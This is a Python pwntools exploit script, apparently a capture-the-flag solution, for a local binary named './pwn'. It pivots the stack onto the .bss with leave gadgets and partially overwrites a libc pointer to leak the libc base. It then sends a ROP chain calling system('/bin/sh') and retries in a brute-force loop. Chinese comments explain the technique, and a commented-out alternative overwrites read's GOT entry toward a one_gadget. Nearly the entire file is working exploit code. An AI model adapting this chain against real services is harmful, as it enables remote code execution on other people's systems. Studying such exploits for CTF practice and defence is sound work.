from pwn import*
import sys
context(arch='amd64', os='linux', log_level='debug')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
read_plt=elf.plt['read']
read_got=elf.got['read']
start=elf.symbols['_start']
bss=0x404000
magic=0x40113c #add dword ptr [rbp - 0x3d], ebx ; nop ; ret
leave=0x4011b9
gadget1=0x110a76 #pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;
read_addr=0x40119E
pop_rbp=0x40113d
ret=0x40101a
fake=bss+0xa00
count=0
# gdb.attach(p,'''
# b *0x4011B9''')
# pause()

while True:
    count+=1
    print(f"Attempt: {count}")
    p=None
    try:
        p=process('./pwn')
        payload=b'a'*0x80+p64(fake-0x18)+p64(read_addr)
        # pause()
        p.send(payload)

        payload2=p64(fake)+p64(start)+b'a'*0x70+p64(fake-0x80-0x18)+p64(leave)
        # pause()
        p.send(payload2)

        payload3=b'a'*0x80+p64(0x404910+0x80)+p64(read_addr)+p64(pop_rbp)+p64(0x404910-0x90)+p64(read_addr)+p64(ret)*0x10+b'\x60\xa3'
        
        #此处为重点，start函数执行完后会在伪栈上布置一个libc地址
        #通过nearpc或者x/50i命令查看汇编在该地址附近发现一处write调用，低二字节为a360
        #可以通过部分覆盖来篡改该libc地址为write调用处的地址
        #并在执行该write调用前通过执行main中的read处来控制rsi与rdx(lea rax, [rbp+buf] ; mov  edx, 500h  ; nbytes mov rsi, rax)
        #如此便成功打印出libc地址
        # pause()# pause()
        p.send(payload3)

        payload4=p64(start)+b'a'*0x78+p64(0x404878)+p64(leave)
        #这个start放置的位置紧挨着b'\x60\xa3'，因此执行完write后便执行这个start
        #之所以用start而不是read,是因为此时的rbp指向位置不可写，需要通过start重置
        # pause()
        p.send(payload4)

        # pause()
        p.send(b'\x00')
        p.recv(0x108)
        libc_addr=u64(p.recv(6).ljust(8,b'\x00'))
        libc_base=libc_addr-0x2a360

        payload5=b'a'*0x88+p64(ret)+p64(0x10f78b+libc_base)+p64(0x404828)+p64(libc.symbols['system']+libc_base)+b'/bin/sh\x00'
        
        # pause()
        p.send(payload5)

        p.sendline(b'echo Pwned')
        p.sendline(b'echo Pwned')
        result=p.recvuntil(b'Pwned',timeout=0.2)
        if b'Pwned' in result:
            print('Exploit successful!')
            p.interactive()
            break
        p.close()

    except KeyboardInterrupt:   
        if p:
            p.close()
        sys.exit(0)
    #  ctrl+c中断时关闭进程并退出
    

    except Exception as e:
        if p:
            p.close()
        continue
    #其余异常时关闭进程并继续尝试

    
# payload=b'a'*0x80+p64(read_got+0x100)+p64(read_addr)
# pause()
# p.send(payload)
# rop_chain = b"1" * 8
# rop_chain += flat([
#     elf.plt['read'],    执行到此时时read_got已经被修改为那个连续的pop指令
#     0xfffdeae5,         rbx(此处的offset通过具体计算，加上该offset后read_got被修改为onegadget)
#     read_got + 0x3d,    rbp
#     0, 0, 0,
#     magic
# ], length=0x38)
# rop_chain += p64(magic+1)   该处为pop_rbp，用于抬高栈，用ret也行
# rop_chain += p64(0x404190)
# rop_chain += p64(elf.plt['read'])  执行到此时时read_got已经被修改为onegadget
# rop_chain = rop_chain.ljust(0x80, b"\x00")
# rop_chain += p64(0x404080)   
# rop_chain += p64(read_addr)
# p.sendline(rop_chain)

# sleep(1)
# p.send(b"\x76\x0a")    覆盖read_got低二字节，从而修改read_got为连续pop指令，但由于真实地址的倒数第四位不确定，因此成功概率十六分之一，需要爆破
# p.interactive()
#这是另一种方法，但是最后由于onegadget的约束条件满足不了而弃用